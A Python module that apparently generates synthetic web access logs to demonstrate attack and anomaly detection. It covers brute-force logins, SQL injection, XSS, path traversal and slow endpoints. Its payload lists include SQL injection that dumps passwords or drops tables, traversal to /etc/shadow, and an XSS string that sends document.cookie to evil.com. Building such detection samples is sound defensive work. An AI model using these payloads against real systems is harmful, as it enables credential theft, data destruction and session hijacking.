from datetime import datetime, timedelta
import random

NORMAL_IPS = [
    "192.168.1.10", "192.168.1.11", "192.168.1.12",
    "10.0.0.5", "10.0.0.6", "172.16.0.20", "172.16.0.21",
]
ATTACKER_IPS = ["45.33.32.156", "104.236.198.23", "185.220.101.34"]
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
    "curl/7.68.0",
    "python-requests/2.28.0",
]
ENDPOINTS = ["/api/users", "/api/products", "/api/orders", "/api/auth/login", "/api/search", "/api/status"]
METHODS = ["GET", "GET", "GET", "POST", "PUT", "DELETE"]

SQLI_PATTERNS = [
    "/api/users?id=1 OR 1=1--",
    "/api/products?category=' UNION SELECT username,password FROM users--",
    "/api/search?q=test'; DROP TABLE orders;--",
    "/api/auth/login?user=admin'--",
    "/api/users?id=1 UNION SELECT * FROM information_schema.tables",
]
XSS_PATTERNS = [
    "/api/search?q=<script>alert(document.cookie)</script>",
    "/api/profile?name=<img src=x onerror=alert(1)>",
    "/api/redirect?url=javascript:document.location='http://evil.com'",
    "/api/comments?text=<svg onload=fetch('http://evil.com?c='+document.cookie)>",
    "/api/forum?post=<body onload=alert('XSS')>",
]
TRAVERSAL_PATTERNS = [
    "/api/download?file=../../etc/passwd",
    "/api/files?path=../../../var/log/auth.log",
    "/api/export?template=%2e%2e%2f%2e%2e%2fetc%2fshadow",
    "/api/backup?dir=....//....//windows/win.ini",
    "/api/import?file=..\\..\\..\\boot.ini",
]


def _fmt_time(base: datetime, offset_seconds: int) -> str:
    return (base + timedelta(seconds=offset_seconds)).strftime("%d/%b/%Y:%H:%M:%S -0300")


def _make_line(ip: str, request: str, status: int, size: int, rt: float, ts: str, ua: str) -> str:
    return f'{ip} - - [{ts}] "{request}" {status} {size} "-" "{ua}" {rt:.3f}'


def generate_normal_traffic() -> str:
    base = datetime(2024, 6, 10, 9, 0, 0)
    lines = []
    for i in range(50):
        ip = random.choice(NORMAL_IPS)
        method = random.choice(METHODS)
        endpoint = random.choice(ENDPOINTS)
        status = random.choices([200, 201, 204, 301, 304, 400, 404], weights=[50, 10, 5, 5, 5, 3, 2])[0]
        size = random.randint(100, 5000)
        rt = round(random.uniform(0.01, 0.5), 3)
        ua = random.choice(USER_AGENTS)
        lines.append(_make_line(ip, f"{method} {endpoint} HTTP/1.1", status, size, rt, _fmt_time(base, i), ua))
    return "\n".join(lines)


def generate_anomaly_scenario() -> str:
    base = datetime(2024, 6, 10, 14, 0, 0)
    lines = []

    for i in range(30):
        ip = "192.168.1.100"
        lines.append(_make_line(ip, "POST /api/auth/login HTTP/1.1", 401, 45, 0.12, _fmt_time(base, i), "python-requests/2.28.0"))

    for i in range(30, 45):
        ip = "10.0.0.99"
        lines.append(_make_line(ip, "GET /api/admin/config HTTP/1.1", 500, 50, 2.5, _fmt_time(base, i), "curl/7.68.0"))

    for i in range(45, 60):
        ip = random.choice(NORMAL_IPS)
        lines.append(_make_line(ip, "GET /api/products HTTP/1.1", 200, 2000, 0.08, _fmt_time(base, i), random.choice(USER_AGENTS)))

    return "\n".join(lines)


def generate_sqli_scenario() -> str:
    base = datetime(2024, 6, 10, 22, 0, 0)
    lines = []

    for i in range(10):
        ip = NORMAL_IPS[0]
        lines.append(_make_line(ip, "GET /api/products HTTP/1.1", 200, 1500, 0.05, _fmt_time(base, i), USER_AGENTS[0]))

    for i, pattern in enumerate(SQLI_PATTERNS, start=10):
        ip = ATTACKER_IPS[0]
        lines.append(_make_line(ip, f"GET {pattern} HTTP/1.1", 200, 432, 0.15, _fmt_time(base, i), "sqlmap/1.7"))

    return "\n".join(lines)


def generate_xss_scenario() -> str:
    base = datetime(2024, 6, 11, 3, 0, 0)
    lines = []

    for i, pattern in enumerate(XSS_PATTERNS):
        ip = ATTACKER_IPS[1]
        lines.append(_make_line(ip, f"GET {pattern} HTTP/1.1", 400, 0, 0.01, _fmt_time(base, i), "Mozilla/5.0 (XSS Scanner)"))

    for i in range(5, 15):
        ip = NORMAL_IPS[1]
        lines.append(_make_line(ip, "GET /api/users HTTP/1.1", 200, 800, 0.04, _fmt_time(base, i), USER_AGENTS[1]))

    return "\n".join(lines)


def generate_traversal_scenario() -> str:
    base = datetime(2024, 6, 11, 8, 0, 0)
    lines = []

    for i, pattern in enumerate(TRAVERSAL_PATTERNS):
        ip = ATTACKER_IPS[2]
        lines.append(_make_line(ip, f"GET {pattern} HTTP/1.1", 403, 45, 0.005, _fmt_time(base, i), "DirBuster/1.0"))

    for i in range(5, 20):
        ip = random.choice(NORMAL_IPS)
        lines.append(_make_line(ip, "GET /api/files/report.pdf HTTP/1.1", 200, 50000, 1.2, _fmt_time(base, i), USER_AGENTS[1]))

    return "\n".join(lines)


def generate_performance_scenario() -> str:
    base = datetime(2024, 6, 11, 12, 0, 0)
    lines = []

    slow_endpoints = [
        ("/api/reports/generate", 5.0, 8.0),
        ("/api/analytics/dashboard", 3.0, 6.0),
        ("/api/export/csv", 4.0, 7.0),
    ]
    for i in range(20):
        endpoint, lo, hi = random.choice(slow_endpoints)
        rt = round(random.uniform(lo, hi), 3)
        ip = random.choice(NORMAL_IPS)
        lines.append(_make_line(ip, f"GET {endpoint} HTTP/1.1", 200, 3000, rt, _fmt_time(base, i), USER_AGENTS[0]))

    for i in range(20, 30):
        ip = random.choice(NORMAL_IPS)
        lines.append(_make_line(ip, "GET /api/ping HTTP/1.1", 200, 10, 0.003, _fmt_time(base, i), USER_AGENTS[2]))

    return "\n".join(lines)


def generate_full_attack_scenario() -> str:
    base = datetime(2024, 6, 12, 16, 0, 0)
    lines = []
    idx = 0

    for _ in range(15):
        ip = random.choice(NORMAL_IPS)
        lines.append(_make_line(ip, "GET /api/products HTTP/1.1", 200, 2000, 0.05, _fmt_time(base, idx), USER_AGENTS[0]))
        idx += 1

    for _ in range(10):
        lines.append(_make_line("45.33.32.156", "POST /api/auth/login HTTP/1.1", 401, 45, 0.11, _fmt_time(base, idx), "hydra/9.2"))
        idx += 1

    attacker1 = ATTACKER_IPS[0]
    for pattern in SQLI_PATTERNS[:3]:
        lines.append(_make_line(attacker1, f"GET {pattern} HTTP/1.1", 200, 500, 0.08, _fmt_time(base, idx), "sqlmap/1.7"))
        idx += 1

    attacker2 = ATTACKER_IPS[1]
    for pattern in XSS_PATTERNS[:2]:
        lines.append(_make_line(attacker2, f"GET {pattern} HTTP/1.1", 400, 0, 0.01, _fmt_time(base, idx), "Mozilla/5.0"))
        idx += 1

    attacker3 = ATTACKER_IPS[2]
    for pattern in TRAVERSAL_PATTERNS[:2]:
        lines.append(_make_line(attacker3, f"GET {pattern} HTTP/1.1", 403, 45, 0.005, _fmt_time(base, idx), "DirBuster/1.0"))
        idx += 1

    for _ in range(5):
        lines.append(_make_line("10.0.0.99", "GET /api/admin/config HTTP/1.1", 500, 50, 3.5, _fmt_time(base, idx), "curl/7.68.0"))
        idx += 1

    for _ in range(5):
        ip = random.choice(NORMAL_IPS)
        lines.append(_make_line(ip, "GET /api/reports/generate HTTP/1.1", 200, 3000, 6.5, _fmt_time(base, idx), USER_AGENTS[0]))
        idx += 1

    return "\n".join(lines)


SAMPLES = {
    "normal": ("Normal Traffic", generate_normal_traffic),
    "anomaly": ("Brute Force & Server Errors", generate_anomaly_scenario),
    "sqli": ("SQL Injection Attacks", generate_sqli_scenario),
    "xss": ("XSS Attacks", generate_xss_scenario),
    "traversal": ("Path Traversal Attacks", generate_traversal_scenario),
    "performance": ("Slow Endpoints", generate_performance_scenario),
    "full-attack": ("Full Attack Scenario (All Combined)", generate_full_attack_scenario),
}
